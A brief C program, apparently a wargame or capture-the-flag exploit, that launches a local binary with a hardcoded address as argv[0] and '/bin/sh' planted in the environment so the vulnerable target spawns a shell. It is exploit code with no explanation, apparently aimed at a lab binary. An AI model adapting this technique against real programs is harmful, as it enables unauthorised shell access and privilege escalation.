#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//author : afang
//comment: what a nice day, isn't it?!

int main()
{
    char *envp[] = {
        "env1=1", "env2=2", "env3=3",
        "/bin/sh", "env5=5", NULL
    };
    execle("/home/tiny/tiny", "\xe7\xe7\x56\x55",
           "A", "A", NULL, envp);
    return 0;
}
